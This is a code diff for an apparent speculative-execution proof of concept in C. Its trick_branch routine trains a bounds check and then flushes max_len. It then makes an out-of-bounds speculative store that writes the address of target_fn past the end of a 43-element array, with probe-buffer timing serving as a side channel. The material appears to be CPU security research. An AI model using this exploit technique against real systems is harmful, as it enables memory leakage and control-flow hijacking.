@@ -20,8 +20,6 @@
 void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
 
-// Use Global instead of local for easier flushing?
-int __attribute__((section(".max_len"))) max_len = 101;
 
 /*
  * Defines the bandwidth we can communicate from speculative -> von neuman
@@ -99,45 +97,32 @@ void check_probes() {
     flush_probe_buf();
 }
 
-void branch(char* str, int len){
-    char local_str[101];
 
+// Use Global instead of local for easier flushing?
+int __attribute__((section(".max_len"))) max_len = 43;
 
-    if (len < max_len){
-        register i;
-        for (i=0; i<len; i++) {
-            local_str[i] = str[i];
-        }
-        //memcpy(local_str, str, len);
+void branch(uint64_t* array, uint64_t entry, int index){
+    if (index < max_len){
+        array[index] = entry;
         return;
     }
     return;
 }
 
-void train_branch(){
-    int i =0;
+void trick_branch(){
+    int i=0;
     int training_rounds = 2000;
-    char buf[80];
-
-    memset(buf, 'A', 80);
+    uint64_t overflow[43];
+    uint64_t good_val = 0xDEADBEEF12345678;
+    uint64_t bad_val  = 0x0000000000434040;
 
     for (i=0; i< training_rounds; i++){
-        branch(buf, 80);
+        branch(overflow, good_val, i%43);
     }
-}
+    
+    _mm_clflush(&max_len);
 
-/*
- * The Address of target_fn is set in linker.ld to be 0x0000000000434040
- * since these buffers will be aligned on the stack, just overwrite the 
- * same thing everwhere, as this should happen speculatively and never 
- * actually write onto stack.
- */
-void trick_branch(){
-    char overflow[136];
-    memset(overflow, 0x44, sizeof(overflow));
-    ((uint64_t *)overflow)[(sizeof(overflow)-1)/sizeof(uint64_t)] = 0x0434040;
-
-    branch(overflow, sizeof(overflow));
+    branch(overflow, bad_val, 49);
 }
 
 void measure() {
@@ -154,8 +139,8 @@ void measure() {
     while (1) {
         //flush_probe_buf_i();
         for (i=0; i<MAX_ITERATIONS; i++) {
-            train_branch();
-            _mm_clflush(&max_len);
+            // train_branch();
+            // _mm_clflush(&max_len);
             trick_branch();
             check_probes();
         }
